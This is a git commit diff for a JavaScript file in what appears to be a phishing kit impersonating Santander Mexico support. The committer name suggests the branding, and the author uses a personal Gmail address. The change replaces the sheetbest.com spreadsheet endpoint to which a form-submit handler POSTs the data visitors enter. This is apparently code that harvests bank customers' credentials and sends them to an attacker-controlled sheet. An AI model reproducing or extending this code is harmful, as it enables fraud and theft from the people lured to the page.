cede8d48479dc56c57f46e256d36e68f940b9571
santandermx-soporte-13 <cacheteshdp2@gmail.com>
2026-03-13 15:18:02 -0600

    Update 1820sa.js

--- santa/js/1820sa.js
+++ santa/js/1820sa.js
@@ -7,7 +7,7 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://api.sheetbest.com/sheets/c4b3435f-e064-4490-b04a-c94d49114333', {
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/1c018632-4bb5-4d62-8712-73531f9d19b7', {
         method: 'POST',
         mode: 'cors',
         headers: {
